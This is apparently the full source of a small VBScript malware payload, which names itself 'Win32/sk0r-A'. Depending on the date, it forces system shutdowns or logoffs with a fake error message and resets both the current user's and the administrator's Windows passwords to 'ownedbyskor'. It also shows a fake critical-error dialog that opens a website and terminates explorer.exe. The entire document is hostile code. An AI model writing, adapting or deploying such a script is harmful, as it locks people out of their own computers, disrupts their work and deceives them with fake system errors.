rem NeEd sOmE sk0r? Win32/sk0r-A Tochterscript
set a = createobject ("wscript.shell") 
if instr(date(),"11") then 
a.run "shutdown -c ""Critical System sk0r Error"" -t 10 -s" 
elseif instr(date(),"17") then 
a.run "net user %USERNAME% ownedbyskor" 
elseif instr(date(),"23") then 
a.run "net user administrator ownedbyskor" 
elseif instr(date(),"27") then 
a.run "shutdown -c ""Critical System sk0r Error""-t 10 -l" 
elseif instr(date(),"07") then 
roflalter = msgbox ("Error 0x000101. Do you want to continue?",vbyesno + vbcritical,"Bad System Error") 
if roflalter = vbyes then 
a.run "www.sexy.de" 
elseif roflalter = vbno then 
a.run "Notepad.exe" 
end if
elseif instr(date()),"29") then 
set wmi = GetObject("winmgmts:") 
Set System = wmi.instancesOf("win32_process") 
For Each process In System
If LCase(process.Name) = "explorer.exe" Then 
process.Terminate (0)
End If
Next
end if
